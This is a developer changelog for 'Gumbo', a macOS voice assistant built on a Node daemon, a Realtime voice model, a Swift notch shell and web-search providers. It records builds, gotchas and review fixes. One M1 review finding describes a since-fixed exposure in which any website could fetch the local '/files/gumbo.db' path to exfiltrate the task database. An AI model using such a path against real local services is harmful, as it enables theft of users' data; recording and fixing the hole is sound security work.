# Gumbo — Implementation Notes

A running log of what got built, decisions made along the way, gotchas hit, and things future
sessions need to know. Append newest entries at the top of each phase. The design source-of-truth is
[`SPEC.md`](./SPEC.md); this file is the changelog + field notes.

**Convention for future sessions:** when you build or change something non-obvious, add a dated bullet
under the relevant phase. Record *why*, not just *what* — especially SDK quirks, version constraints,
and anything that would surprise the next person. Keep it honest (note what's verified vs assumed).

---

## Status

- **M1 — Brain, text-driven:** ✅ complete and verified end-to-end.
- **M2 — Swift shell + voice:** ✅ complete — live-validated with the user (voice round-trips
  through the signed shell). Two follow-ups to observe in daily use: voice-exercised barge-in
  and the TCC rebuild-persistence check.
- **M3 — Completion presence:** ✅ complete — live-validated with the user, review+address pass
  done, merged to main (see §M3 below).
- **Web search providers (side feature, merged from `worktree-web-search-providers`):** ✅ built +
  verified — Tavily on the voice hot path (`web_quick_lookup`), Exa for background sub-agents,
  FTS5 memory persistence, JSONL search audit log. See §Web search providers below.
- **M4 — Claude Code + supervisor (+ M4.1 OS sandbox):** ✅ built + review-hardened + smoked
  (see §M4) — live voice demo with the user pending.
- **M5 — Images + Gumbo-owned scheduler:** ✅ built + smoked end-to-end on an isolated daemon
  (see §M5) — live voice demo with the user pending (incl. the first-run Reminders TCC prompt).
- **M6:** not started. See SPEC §9.

---

## Environment facts (verified)

- Node **v26.3.1**, npm 11.16 (Homebrew). Node 26 gives us built-ins we rely on: `node:sqlite`
  (`DatabaseSync`), `process.loadEnvFile`, and a global `WebSocket`.
- This Mac runs a **macOS 27.0 beta** — spike DynamicNotchKit + TCC behavior early (M2 risk).
- `.env` at repo root holds `OPENAI_API_KEY`, `EXA_API_KEY`, and `TAVILY_API_KEY`.
- **No git repo** yet — fixes are applied without commits (matches the user's "don't commit unless
  asked" rule). Initialize git when the user asks.
- **Sandbox note:** automated/sandboxed dev runs can't write to `~/Gumbo`; use
  `GUMBO_HOME=<scratchpad>` to run the daemon in those contexts. the user created the real `~/Gumbo`.

---

## M1 — Brain, text-driven

### Build (initial)
- Monorepo: npm workspaces `daemon` (Node/TS, `tsx watch`) + `dashboard` (React 19 + Vite 6 + zustand).
- Event store on **`node:sqlite`** (no `better-sqlite3` — avoids native-module builds lagging Node 26).
  WAL mode; `tasks` + `events` tables.
- Orchestrator = `gpt-realtime-2.1` over **websocket** transport, `outputModalities: ['text']` for
  M1 (flip to `['audio']` at M2). Driven by a dashboard `debug_text` composer.
- Generic sub-agents = `gpt-5.6-terra` via `@openai/agents` `run()` streaming, with a custom
  `web_search` tool wrapping `exa-js`, plus the hosted `codeInterpreterTool()`.
- Dashboard honors the **no-`useEffect`** rule via a module-scope WS singleton (`ws.ts`) → zustand.

### Gotchas hit
- `@openai/agents` 0.13 requires **zod v4** (peer dep); zod 3 fails `npm install`.
- `exa-js` (1.10) default import doesn't expose a named `WebSocket`-style export; use
  `import { Exa } from 'exa-js'` and `exa.searchAndContents(query, { text: { maxCharacters } })`
  (the `contents:{...}` shape from older docs is wrong for this version).
- Node ESM with `.ts` import specifiers needs `allowImportingTsExtensions: true` in tsconfig.
- Bug found during first verification: orchestrator (voice-model) tool calls weren't being logged —
  only sub-agent tool calls were. Fixed by also listening to the transport `function_call` event in
  the Realtime session.

### Review + address pass (2-agent /review-2, then /address)
Two Opus reviewers (debugger + auditor) reviewed the M1 codebase. **All findings addressed.** Notable:

- **CRITICAL — orchestrator wedge:** the `connecting` promise was only nulled on the success path, so
  a single transient connect failure left every future message awaiting a permanently-rejected
  promise (Gumbo dead until restart). Fixed with `try/finally` nulling `connecting` on both paths.
- **CRITICAL — network exposure:** daemon bound all interfaces + wildcard CORS + no WS origin check,
  so any website the user visits could drive the agent (burn credits) and `fetch('/files/gumbo.db')`
  to exfiltrate the whole task DB; any LAN device could `curl` it. Fixed three ways: bind
  `127.0.0.1`, delete the wildcard CORS header (dashboard uses the Vite proxy), add a WS
  `verifyClient` **Origin allowlist** (no-Origin native clients allowed → the future Swift shell).
- **Restart reaper:** tasks left `running` when the daemon dies (frequent under `tsx watch`) now get
  reaped to `failed` on Store init, so status stays truthful. Verified: flipped a task to `running`,
  restarted, it became `failed` with `"interrupted by daemon restart"`.
- **Cancellation:** the `AbortSignal` is now passed into `run()` so cancel actually aborts the model
  request (previously only stopped event forwarding, kept billing).
- **Task completion correctness:** switched to two-arg `.then(onFulfilled, onRejected)` so a failure
  while *writing* the report can't mislabel a succeeded task; `finish()` is now idempotent (guards a
  `finished` set) so no double `task.finished` / double-announcement.
- **Announcement collision:** completion announcements now prefer `transport.requestResponse?.()`
  (defers until any in-flight response completes) instead of a raw `response.create` that the server
  rejects mid-turn.
- **`/files` hardening:** restricted to `tasks/`/`images/`/`notes/` subtrees + `realpath` symlink
  re-check; **DB moved to `db/gumbo.db`**, outside the served subtree entirely. Stream now has an
  `error` listener so a mid-read I/O error can't crash the daemon.
- **Dashboard:** bootstrap now **merges** the HTTP snapshot with live-arrived events (deduped by
  `seq`, sorted) instead of a blind replace that dropped events arriving during the fetch window;
  `ReportPanel` gets a remount `key` so switching between two done tasks refetches; `Row` is
  `React.memo` and the streaming line is isolated into its own component so per-token updates don't
  re-render the whole feed; a **cancel button** on running tasks wires up the previously-dead
  `cancelTask` export. Tasks array is capped (200).
- Smaller: `EXA_API_KEY` validated at boot alongside OpenAI; inbound WS payloads shape-guarded;
  `status` `CHECK` constraint on the tasks table; magic truncation length centralized as
  `config.activityLogMaxChars`.

### New requirements folded in (from the user, this session)
- **Organized agent home:** `~/Gumbo/` is no longer flat — `tasks/`, `images/`, `notes/`, `db/`,
  created on boot. Only the first three are `/files`-served; the DB is private.
- **Agent self-organization:** added a `save_note` tool (one file per topic under `notes/`, append or
  replace) so Gumbo can retain durable knowledge across sessions. Verified live: asked it to save an
  editor preference → `notes/editor-preference.md` created. Deeper self-organization (archiving,
  reorganizing) is specced for later phases.
- **Name:** the agent addresses the user as **the user** (not the user). Applied to orchestrator
  instructions + announcement template.
- **Hotkey (spec only — Swift is M2):** mic activation is **Control + Option held together**. This is
  a modifier-only chord, so it must be detected with an `NSEvent` `.flagsChanged` global monitor
  (both `⌃` and `⌥` down, no letter), *not* a modifier+key binding library. Captured in SPEC §9 M2.

### Verified in M1 (how)
- Full research round-trip driven from the dashboard (Playwright): sub-agent streamed 5 Exa searches,
  `report.md` landed, follow-up "one-line takeaway" correctly triggered `read_report`.
- Daemon restart → dashboard history re-rendered from sqlite (persistence).
- Post-fix live checks: loopback bind (`lsof` shows `127.0.0.1` only), no CORS header, `/files`
  cannot reach `db/gumbo.db` (404 for both `../db/…` and `db/…`), restart-reaper flips `running`→
  `failed`, `save_note` writes an organized note, WS origin allowlist admits both the dashboard
  (`localhost:5173`) and a no-origin native client.

### Open items / assumptions to confirm later
- Model IDs (`gpt-realtime-2.1`, `gpt-5.6-terra`, `gpt-image-2`) are pinned in `config.ts`; confirm
  against the live API when each is first exercised.
- `transport.requestResponse` existence is feature-detected with a `sendEvent` fallback — validate
  against the installed SDK build when audio lands.
- Synchronous sqlite + broadcast run on the same event loop as the Realtime transport. Fine at M1
  (events are per run-item, low rate). Revisit batching/offload when M2 puts audio frames on the loop.

---

## M2 — Swift shell + voice (complete)

### Build — daemon audio path + real shell (2026-07-14/15)

**Daemon (additive — M1 text path still works, now with spoken replies):**
- `config.ts`: `outputModalities ['audio']`, `voice: 'marin'`, `realtimeAudio` (pcm16 both ways,
  input transcription via `gpt-4o-mini-transcribe` so voice turns persist with real user text,
  `turnDetection { type:'server_vad', createResponse:false, interruptResponse:true }`),
  `minPttAudioBytes` (100 ms @ 24 kHz — the API rejects commits under ~100 ms of audio).
- `ws/protocol.ts`: inbound `ptt_press`/`ptt_release`; outbound `playback_flush`; binary framing
  documented (shell→daemon raw mic pcm16; daemon→shell `0x01` + speaker pcm16, `0x02` reserved).
- `ws/hub.ts`: `onBinary(handler)` + `sendBinary(frame, role)`; binary frames require a prior
  `hello` like text frames.
- `realtime/session.ts`: PTT state machine. Press arms + lazily connects; mic frames stream via
  `session.sendAudio`; frames arriving mid-connect are buffered (cap 500) and flushed in-order
  after connect, so the first words of a cold-start turn aren't clipped; a release that beats the
  connect is remembered (`pendingRelease`) and committed after connect. `session.on('audio')` →
  `hub.sendBinary` to shell; `audio_interrupted` → `playback_flush`. `assistant_delta` now
  broadcasts to **all** clients (shell notch transcript + dashboard). `connection_change:
  disconnected` cleans up a dead transport so the next press reopens fresh.
- **Commit semantics (the runtime-untested half of the PTT model — now verified):** with
  `createResponse:false` the server VAD still auto-commits at speech pauses; on release we commit
  manually **only** when `speechActive || (hadSpeech && !sawCommit)` — an unconditional commit
  errors on an empty buffer. Then `response.create` (via `transport.requestResponse?.()`) only if
  the window actually had speech; then `input_audio_buffer.clear` to drop trailing silence.
- **GOTCHA (cost a debugging round): server-VAD speech state sticks across PTT windows.** The
  normal PTT gesture — release mid-speech, faster than the VAD silence window — leaves the
  server VAD in "speech". The next armed window then never fires `speech_started` (deaf turn,
  no barge-in). `input_audio_buffer.clear` does NOT reset it. Fix: after every turn, toggle
  `turnDetection` null → config via `transport.updateSessionConfig` (two `session.update`s).
  Verified with a 4-window mixed-mode smoke on one session: all four rounds green.
- **Daemon-only smoke (throwaway scratchpad clients, `say`-generated 24 kHz pcm16):** PTT
  fast-release ✅, VAD-pause release ✅, barge-in ✅ (`playback_flush` ~150 ms after speech onset
  mid-reply, second response clean), `debug_text` → spoken reply ✅. Zero `session.error`s.

**Shell (`shell/` real app — builds + runs ad-hoc signed on the 27.0 beta):**
- `project.yml`: LSUIElement, mic usage string, sandbox off, bundle id `ai.scalinity.Gumbo`,
  DynamicNotchKit pinned `exactVersion: 1.1.0`. Signs with the real **Apple Development** cert
  (Manual style + `DEVELOPMENT_TEAM: REDACTED-TEAM-ID` — signs straight from the keychain, no portal).
- **GOTCHA (signing): a fresh Xcode-created cert can still be "0 valid identities".** the user's
  cert (issued 2026-07-15, WWDR **G3** issuer) sat invalid in the keychain because the only WWDR
  intermediate present was the **G1 that expired Feb 2023** — the chain couldn't build. Fix:
  `curl -sO https://www.apple.com/certificateauthority/AppleWWDRCAG3.cer && security import
  AppleWWDRCAG3.cer -k ~/Library/Keychains/login.keychain-db` → identity immediately valid;
  app now signs with the full the user → WWDR G3 → Apple Root CA chain.
- **GOTCHA (macOS 27 beta, probed 4 orderings): VPIO enable order is load-bearing.** Enabling
  `setVoiceProcessingEnabled(true)` *before* touching the playback graph → engine start fails
  with **-10875** (output unit kAUInitialize). Working order: attach player + connect to
  `mainMixerNode` (mono float at the **hardware output rate** — a 24 kHz connection is the
  spike's -10851 trap) **first**, then enable VPIO, then read the input format (it changes under
  VPIO — the mic becomes a 48 kHz/9-ch array here) and install the tap. All PCM conversion at the
  buffer level via `AVAudioConverter` both directions.
- **GOTCHA (found in live validation): `AVAudioConverter` does NOT downmix the VPIO mic.** The
  9-channel discrete input → mono conversion "succeeds" but outputs **pure silence** (default
  channel map maps nothing) — the daemon received perfectly-paced frames of `peak=0.000`, the
  server VAD rightly never fired, so Gumbo never answered while the notch bars (raw ch0 level)
  looked alive. Fix: extract **channel 0** (the voice-processed signal) into a mono buffer by
  hand; the converter only ever does mono 48 kHz float → mono 24 kHz int16. The engine now logs
  per-channel capture peaks once per start and converter errors loudly — silent-audio failures
  must never be invisible again.
- `AudioEngine`: `start(reason:)` seam (`.ptt`, `.playback`; `.wakeWord` later). Mic frames gated
  by `armed` (set strictly around ⌃⌥). Playback: chunks arriving before the engine is up are
  queued (spoken reply with no prior press — dashboard text turns, M3 announcements) and drained
  on start; flush bumps a generation counter so stale completion handlers can't corrupt the
  drain state; engine auto-stops after ~75 s fully idle (VPIO otherwise holds the mic indicator).
- `Hotkeys`: `.flagsChanged` global+local monitors; press = ⌃⌥ down with ⌘/⇧ absent; release =
  either lifting; extra modifiers joining mid-hold don't cancel. Prompts for Accessibility via
  `AXIsProcessTrustedWithOptions` on first launch.
- `NotchController`: DynamicNotchKit. **1.1.0 API notes:** `DynamicNotch` is generic over
  ⟨Expanded, CompactLeading, CompactTrailing⟩ — store it as
  `DynamicNotch<Content, EmptyView, EmptyView>`; its init is `@MainActor`. Simmer bars (ember
  when thinking/speaking, bay when listening) + head-truncated transcript line; hide is debounced
  1.4 s so back-to-back turns don't flap; tap → dashboard window.
- Shell/daemon state merge: daemon `speaking` tracks *generation*, which ends seconds before
  audible playback — the shell holds `speaking` while its own queue drains (`playbackDraining`).
  While armed, `listening` wins the display.
- `WSClient`: URLSessionWebSocketTask, auto-reconnect (1.5 s), hello on open — survives daemon
  restarts under `tsx watch`. `DashboardWindow`: WKWebView → `http://localhost:5173` exactly.

**Verified end-to-end (2026-07-15, live with the user):** hold-⌃⌥-speak-release → spoken answer
through the shell (multiple turns; mic peaks 0.008–0.452 at the daemon, VAD speech events,
commit-on-release `hadSpeech/speechActive/sawCommit` all correct, `response.created/done`,
`playback active`); both voice transcripts persisted with real text (input transcription);
notch listening/speaking states live. Also verified pre-live: daemon-only PTT/VAD-pause/
barge-in/text smokes, WS reconnect across `tsx watch` restarts. **Still pending:** live
*voice* barge-in (proven at the protocol level in the daemon smoke, not yet exercised by
voice), idle-close observation in real use, and the TCC persistence check itself — the app now
signs with the real cert (one fresh mic + Accessibility grant needed after the ad-hoc→signed
identity change), then one rebuild must confirm grants stick (risk #3). `shell/spike/` deleted
(real shell supersedes it; findings recorded here).

### Forward-compat: keep the Realtime layer modular (GPT-Live)
GPT-Live API availability has **not** been announced. The integration relies on
`gpt-realtime-2.1`; keep the Realtime transport + event-handling layer modular — model ID
stays a single `config.ts` constant, and session lifecycle / audio I/O / event wiring stay
isolated in `realtime/` — so migrating to GPT-Live is a localized swap when it drops.
(the user's note, 2026-07-14.)

### Spike 1a — audio pipe (echo) ✅ pipeline proven
Throwaway target at `shell/spike/` (its generated `.xcodeproj` + `DerivedData/` are
gitignored). SwiftUI app: mic → `AVAudioEngine` tap → `AVAudioConverter` → 24 kHz mono
PCM16 → 20 ms WS binary frames → `echo-server.mjs` (127.0.0.1:**8788**) → back →
`AVAudioPlayerNode`.

**Proven:** the full capture → 24 kHz PCM16 convert → WS framing → playback chain works
end-to-end with the **built-in mic**. WS round-trip ~1 ms. Output path + device routing
are clean — a mic-free 440 Hz test tone plays perfectly, including to AirPods.

**Findings that shape the real shell (M2 audio):**
- **A Bluetooth headset (AirPods) as mic + speaker simultaneously → silent input tap.**
  The plain `installTap` path captures nothing (level meter flat). Fix = **Voice-Processing
  I/O** (`inputNode.setVoiceProcessingEnabled(true)`), which also gives the two things the
  real system needs regardless: **acoustic echo cancellation** (so Gumbo's voice on
  speakers doesn't leak into the mic and false-trigger barge-in) and **automatic gain**
  (fixes the low, muffled built-in-mic level seen here). ⇒ **`AudioEngine.swift` must run in
  VPIO mode.**
- Enabling VPIO in the spike tripped `-10851` (kAudioUnitErr_InvalidPropertyValue) at
  engine start because playback used a custom 24 kHz player→mixer connection. Lesson: with
  VPIO, keep the whole graph in the unit's native I/O format and convert PCM at the buffer
  level, not via a mismatched connection format. (Left OFF in the throwaway spike — belongs
  in the real AudioEngine.)
- **Bluetooth output latency (~150–200 ms) is inherent** on AirPods; it read as bad delay
  only because the spike echoes *your own* voice. For one-way Gumbo speech it's normal.
  Wired/built-in output is much tighter.
- Dev loop confirmed: `xcodegen generate` + `xcodebuild` from CLI (the user authorized builds
  for this project); Xcode-beta **27.0** selected via `sudo xcode-select`. App runs
  **ad-hoc signed** (`CODE_SIGN_IDENTITY=-`), enough to test but re-prompts mic on each
  identity change.

**Still open (quick):** TCC grant-persistence check (risk #3) needs a real **Apple
Development certificate** in the keychain — signing into Xcode with an Apple ID is NOT
enough; create the cert (Xcode ▸ Settings ▸ Accounts ▸ team ▸ Manage Certificates ▸ + Apple
Development), then `security find-identity -v -p codesigning` lists it. Deferred to the
first signed build.

### Spike 1b — Realtime round-trip ✅ voice loop proven
Throwaway `shell/spike/realtime-server.mjs` (port 8788, drop-in for the echo server): opens
a real `gpt-realtime-2.1` `RealtimeSession` (websocket transport), forwards the spike app's
mic PCM16 → `session.sendAudio`, streams `session.on('audio')` chunks back to the shell.

**Proven live against the installed SDK + model:**
- `gpt-realtime-2.1` connects and answers in voice — **response time excellent**, intelligible.
- Server-VAD turns fire (`input_audio_buffer.speech_started` / `speech_stopped`); responses
  generate (`response.created` / `response.done`).
- **Barge-in works**: `interruptResponse:true` → `audio_interrupted` fired on every speech
  onset during a response. (Seen via the feedback loop, but it's the same interrupt path
  ⌃⌥-barge-in uses.) `sendAudio` + `on('audio')` + `on('audio_interrupted')` all confirmed.
- Config shape confirmed: `config.outputModalities = ['audio']`,
  `config.audio.input.turnDetection = { type:'server_vad', createResponse, interruptResponse }`.

**Confirmed the AEC requirement the hard way:** on **speakers** (no headphones) it runs away —
Gumbo hears itself, VAD fires, it interrupts + re-responds forever. The real shell avoids
this two ways: (1) **PTT mic-gating** — mic streams only while ⌃⌥ is held, so Gumbo isn't fed
its own voice while speaking; (2) **VPIO acoustic echo cancellation** — cancels Gumbo's voice
from the mic even when armed for barge-in. Spike has neither ⇒ headphones needed for the
**spike only**, not the finished product.

**Not yet runtime-tested (deferred to real shell):** the PTT turn config proper
(`createResponse:false` + manual commit-on-release + `requestResponse`) — 1b used server-VAD
auto-turns. The *interrupt* half of barge-in is proven; the *manual-commit* half is not.

### Spike 2 — DynamicNotchKit on macOS 27 beta ✅ renders cleanly
Throwaway `shell/spike/notch/` (separate project so the SPM dep stays isolated).
DynamicNotchKit **1.1.0** (pinned `exactVersion`) fetched + compiled against Xcode 27.0 with
no changes; both `DynamicNotchInfo(icon:title:description:)` and the custom-content
`DynamicNotch { … }` builder APIs are correct for 1.1.0. Live on the 27.0 beta: info + custom
notches both render, anchored correctly, expand/hide animations smooth, nothing visually off.
Risk #5 retired — clear to build the real notch UI on DynamicNotchKit 1.1.0.

### All pre-build risks cleared → build the real M2
- **Daemon** (additive; keep the M1 text path working): `config.ts` (outputModalities
  `['audio']`, `audio.input.turnDetection`, voice), `ws/protocol.ts`
  (ptt_press/ptt_release, playback_flush), `ws/hub.ts` (binary routing: onBinary/sendBinary),
  `realtime/session.ts` (audio config, sendAudio, forward `audio` → shell, audio_interrupted →
  flush, ptt commit + requestResponse, session_state), `index.ts` (wire it up).
- **Shell** (`shell/` real app): project.yml (LSUIElement, mic + reminders usage, sandbox off,
  signing), WSClient, **AudioEngine in VPIO mode** (AEC/AGC/Bluetooth — solve the -10851 by
  keeping the graph in the unit's native format), ⌃⌥ `.flagsChanged` chord, NotchController,
  DashboardWindow (WKWebView → localhost:5173).
- **Loose end:** Apple Development cert still not in keychain (`security find-identity` = 0);
  needed for the signed build + TCC grant-persistence check (risk #3).

---

## Web search providers — Tavily (voice hot path) + Exa (background) — 2026-07-15

### Build
- New `daemon/src/search/` module: `client.ts` (shared `postJson` + typed `SearchError`),
  `tavily.ts`, `exa.ts`, `audit.ts`. Both providers are **raw `fetch` clients** — `exa-js`
  removed (its 1.x request shapes predate Exa 2.0, and owning serialization gives us uniform
  retry/timeout/typed-error behavior + testability). Conventions codified in the new root
  **`CLAUDE.md`** — follow it for any future provider.
- **Hot path:** realtime tool `web_quick_lookup` (registered in `realtime/tools.ts`) → Tavily
  `/search`, `search_depth` from `config.search.tavilyDepth` (default `fast`), `include_answer:
  true`, `max_results` 5, `retries: 0`. Success returns `{answer, sources}` (answer-first,
  spoken nearly verbatim); any failure returns a structured `lookup_failed` shape that
  instructs the model to offer backgrounding instead of guessing. The tool description is the
  router between this and `spawn_subagent` — its wording is part of the spec; don't loosen it.
  A `topic` param (`general`/`news`) routes scores/headlines to Tavily's fresher news lane.
- **Background:** sub-agent tools (per-task closures in `agents/openai-runner.ts`) —
  `web_search` (Exa `/search`, tier `fast`/`auto`/`deep`, model picks `deep` only for
  research-class briefs) and `fetch_page_contents` (Exa `/contents` follow-up on promising
  URLs). Full contents `{text: true, highlights: true}` — **deliberately no `maxCharacters`
  anywhere** (the old M1 tool clamped at 2 000 chars; verified bodies up to 190 k chars now
  persist). Raw results + the finished report land in a new sqlite `memory` table with an
  FTS5 index (`memory_fts`, insert-trigger synced); every outbound call (both providers,
  success *and* failure) appends a JSONL line to `~/Gumbo/logs/search-audit.jsonl`.
- Plumbing: `TAVILY_API_KEY` added to boot validation (already in `.env`); new `home.logs`
  dir; `GUMBO_PORT` env override so test instances don't collide with a live daemon; daemon
  `npm test` script (`node --test`, 24 unit tests: retry/backoff, typed errors, request
  serialization for both providers, hot-path fail-fast, quick-lookup success/failure contracts).

### Schema surprises / gotchas (verified against live docs + API, 2026-07-15)
- Tavily `search_depth` now has **four** values: `basic | advanced | fast | ultra-fast`
  (hyphen, not underscore). `fast`/`ultra-fast` cost 1 credit; `safe_search` unsupported there.
- Exa 2.0 `type` has **six** values, not three: `instant | fast | auto | deep-lite | deep |
  deep-reasoning`. We expose `fast/auto/deep`. Exa docs moved: `docs.exa.ai` 307-redirects to
  `exa.ai/docs`. `text: true` = full page text, no default cap (`maxCharacters` only if set;
  there's also a `verbosity` knob, default `compact`, untouched).
- **Tavily had a live incident during verification:** for ~5 min every depth returned an empty
  envelope (`results: [], answer: null`) with `response_time` pinned at ~2.0 — and those empty
  responses got **cached per (query, params) key**, so identical retries kept serving the stale
  empty answer (~50 ms) while a different `topic` (= different cache key) worked. If a specific
  query mysteriously returns no answer, rephrase or switch topic. The failure contract handled
  the incident correctly live: the model told the user the lookup failed and offered a background
  task — zero guessing.
- **Spec deviation, deliberate:** hot-path timeout is **3 000 ms**, not the spec'd 2 000.
  Measured fresh-query latency with answer synthesis: 1.9–2.8 s (plus the incident window
  above) — a 2 s cap timed out on ~half of real lookups. Fail-fast mechanism unchanged; single
  config constant (`quickLookupTimeoutMs`) to tighten later.
- The task brief assumed a Rust back office, an existing FTS5 memory, a JSONL audit convention,
  and a permission engine. Reality: the back office is this Node daemon; the FTS5 table and the
  JSONL audit log were **created** by this work (minimal, inside existing layers); the
  permission engine is M4 — when it lands, register both providers (hot-path auto-allowed,
  background research under task approval).

### Verified (how)
- 24/24 unit tests green (`npm test -w daemon`).
- Smoke 1 (isolated daemon on `GUMBO_PORT=8747`, scratchpad `GUMBO_HOME`): "what's the score of
  the France Spain match" → single voice turn, model chose `web_quick_lookup` with
  `topic: "news"` on its own, Tavily answered in budget with 5 sources (audit line
  `resultCount: 5, ok: true`), answer relayed nearly verbatim.
- Smoke 2: "research the current state of solid-state battery manufacturing and give me a
  brief" → `spawn_subagent` → 4 Exa `auto` searches → `report.md` (13 KB) → `task.finished` →
  spoken completion announcement. Memory table: 100 `search_result` rows (max body 190 k chars
  — unclamped confirmed) + `task_output` rows; FTS5 `MATCH` query returns ranked hits; 10 Exa
  audit lines.
- Failure path live (during the Tavily incident): timeout → structured failure → model offered
  backgrounding, then actually ran it via Exa. Exactly the designed routing.

### Review + address pass (2-agent /review-2, then /address) — 2026-07-15
Two Opus reviewers (debugger + code-auditor) reviewed the changeset: 0 critical, 5 warnings,
7 suggestions — **all addressed** (8 commits after `f810bd0`). Notable:
- **Completion truthfulness:** a sqlite failure while indexing the report (or persisting search
  results mid-run) could flip a *succeeded* task to `failed` / kill a task holding good results.
  Both persistence paths are now best-effort: `report.md` + `finish('done')` stay on the critical
  path, memory indexing logs-and-continues.
- **Audit consistency:** Exa logged `empty_results` as `ok:true` before throwing, and Tavily
  audited in the tool wrapper instead of the client. Both providers now audit at the client
  choke point with `empty_results` as `ok:false`.
- **Realtime-loop protection:** FTS tokenization of full-page bodies is synchronous sqlite work
  on the loop that also carries voice audio — persistence now indexes one row per event-loop
  turn (`setImmediate` chain) instead of 10 × ~200 KB in one burst.
- **Cancellation reaches the wire:** task abort now composes into every provider fetch via
  `AbortSignal.any` (raw abort reason rethrown so `cancelled` status survives); previously a
  cancelled `deep` search kept its HTTP request alive up to 180 s.
- Smaller: `GUMBO_PORT` validated (empty string → port 0 trap), stale "≤2 s" comment fixed,
  insert-only FTS invariant + missing retention policy documented in the schema, audit-dir
  mkdir memoized off the hot path, test glob widened to `src/**` with new coverage for the
  store round-trip, audit JSONL contract (incl. newline-forge resistance), and runner helpers
  (37 tests total).
- **GOTCHA (test runner):** `node --test <pattern>` exits **0** when the pattern matches zero
  files — a wrong glob or cwd silently "passes". Bit us once mid-review (ran from repo root
  instead of `daemon/`); there's no non-hacky guard, so just check the reported test count.
---
## M3 — Completion presence (built; live demo pending)

### Build — daemon cold TTS + bubble/pulse wiring, shell bubbles + pulse (2026-07-15)

**Daemon:**
- `config.ts`: `models.tts: 'gpt-4o-mini-tts'` + `bubbleLingerMs: 12_000`. **Verified against
  the live API before building:** `/v1/audio/speech` accepts the **`marin`** voice on this
  model (announcements match the realtime session's voice) with `response_format: 'pcm'` →
  **24 kHz mono pcm16 — the shell's exact wire format, zero transcoding** (a one-line test
  sentence returned 194,400 bytes ≈ 4.05 s at 48,000 B/s, confirming the rate).
- `audio/announce.ts`: plain template text per terminal status (no LLM call) +
  `speakAnnouncement` — streams HTTP chunks out as `0x02` frames *as they arrive* (playback
  starts before synthesis finishes). Two deliberate details: a **carry byte** keeps every
  frame sample-aligned (an HTTP chunk can split a 16-bit sample; an odd frame would
  byte-shift the rest of the stream into static), and announcements are **serialized through
  a promise queue** (two tasks finishing together must not interleave frames into the
  shell's single player). The queue swallows its own rejections so one failed TTS can't
  wedge all future announcements.
- `realtime/session.ts` cold branch: still persists `announce.pending` (dashboard record),
  then speaks cold **only if a shell is connected** (`hub.hasRole('shell')` — no listener,
  no synthesis spend). Never opens a realtime session to announce (locked decision).
- `index.ts`: a second `store.onEvent` listener maps the task lifecycle to shell messages —
  `task.created` → `bubble_upsert` (running); `task.finished` → `bubble_upsert` (terminal) +
  `notch_pulse`, then `bubble_remove` after the linger. Registered **after** the restart
  reaper runs, so tasks reaped on boot don't pulse a shell that isn't even connected yet.
  `hub.onHello` re-sends running bubbles to a (re)connecting shell — shell relaunches and
  tsx-watch daemon restarts are routine, so bubbles must be re-syncable, not fire-and-forget.
- `ws/hub.ts`: `onHello(handler)` + `hasRole(role)`. `ws/protocol.ts`: `bubble_upsert` /
  `bubble_remove` / `notch_pulse` shapes (`BubbleStatus` = running|done|failed|cancelled).

**Shell:**
- `Bubbles/BubbleController.swift` (new): one borderless **non-activating** `NSPanel` per
  task (`.statusBar` level, joins all Spaces, never activates the app on click), stacked
  upper-right inside `visibleFrame`, newest on top, animated restack. Visuals reuse the
  dashboard's exact tokens (`--bg`/`--line`/`--ember`/`--bay`/`--alarm`/`--faint`); the
  running dot breathes on the dashboard's 1.6 s pulse cadence. Click → dashboard at that
  task's view. A **30 s local failsafe** removes terminal bubbles even if the daemon dies
  during its 12 s linger window (otherwise a zombie bubble would sit there forever).
- `NotchController.pulse(status:)`: 2.6 s transient — bay/alarm/faint ripple + "Task
  finished/failed/cancelled" title. It only decorates the **idle** notch: if a live session
  is displaying (e.g. the shell is playing the announcement, so `playbackDraining` holds
  'speaking'), the session display wins — 'speaking' is the more truthful presence. The
  hide-debounce now also refuses to hide mid-pulse.
- `DashboardWindow.show(taskId:)`: deep-links via `window.__gumboSelectTask(id)` — a
  module-scope hook added in `dashboard/src/ws.ts` (no `useEffect`; the store's existing
  `selectTask` already renders the task-filtered feed + report panel). Retries 5×/0.6 s
  because the hook isn't installed until the page finishes loading on first open. Task id
  is sanitized (alphanumeric + hyphen) before JS interpolation.
- `App.swift`: `0x02` frames take the **exact `0x01` playback path** — `start(reason:
  .playback)` + `playChunk`; the M2 `pendingPlayback` queue already covers the cold engine
  start, so nothing in AudioEngine changed.

**Verified (smokes, 2026-07-15):**
- *Cold path* (real daemon modules on a test port, fake shell WS client): calling
  `announceTaskFinished` with no session persisted exactly one `announce.pending`, produced
  **zero `session.opened`**, zero `session.error`, and delivered **81 `0x02` frames, every
  one sample-aligned** — 3.45 s of pcm, peak 18,102 (healthy speech), 2.5 s end-to-end.
- *Lifecycle* (the real `src/index.ts`, real spawned sub-agent via `debug_text`):
  `bubble_upsert` running on spawn → dropped + reconnected the fake shell mid-task and the
  running bubble was **re-sent on hello** → `bubble_upsert` done + `notch_pulse` on finish →
  `bubble_remove` arrived after the 12 s linger; the live-path announcement flowed as `0x01`
  audio (session was open — M1/M2 path intact).
- Shell builds clean and **signs with the real Apple Development cert** (identity valid in
  keychain; no WWDR re-import needed this time).

**Still to observe live with the user (SPEC M3 demo — SPEC stays unmarked until then):**
voice-spawn a task → walk away → session idle-closes → bubble flips bay + notch pulses +
**cold** spoken announcement (verify via events: no `session.opened` around it); plus the
two M2 carry-overs on this rebuild — TCC grants (mic + Accessibility) must NOT re-prompt,
and voice barge-in should stop playback <200 ms.

**Known edge (accepted for M3):** pressing ⌃⌥ *during* a cold announcement can briefly
overlap realtime reply audio with the TTS tail in the shared player; barge-in's
`playback_flush` clears both. Fixing it properly means separate playback channels — deferred.

### Follow-up — mic-free playback graph (2026-07-15, from the user's live report)

the user saw the **orange mic indicator whenever the app ran**. Cause: the M2 engine was a
single always-VPIO graph — macOS lights the indicator when the *input unit is open*, not
when frames stream, so pure playback (replies, announcements) and the 75 s idle linger all
kept it lit even though mic frames only ever flow while ⌃⌥ is held. Fix, per the user's ask:

- `AudioEngine` now has **two graph modes**: `playbackOnly` (player graph only, `inputNode`
  never touched → **no mic indicator**; also plays without mic permission) for `.playback`
  starts, and `duplex` (VPIO + tap, the full M2 graph) for `.ptt`. All the M2 ordering
  gotchas (-10875 / -10851 / ch0 extraction) unchanged inside the duplex branch.
- Playback became **queue-based** (≤3 buffers scheduled ahead, rest stays as pcm `Data`):
  a ⌃⌥ press during mic-free playback swaps the graph **live** and the unscheduled queue
  survives the switch — press-and-stay-silent still hears the rest of an announcement.
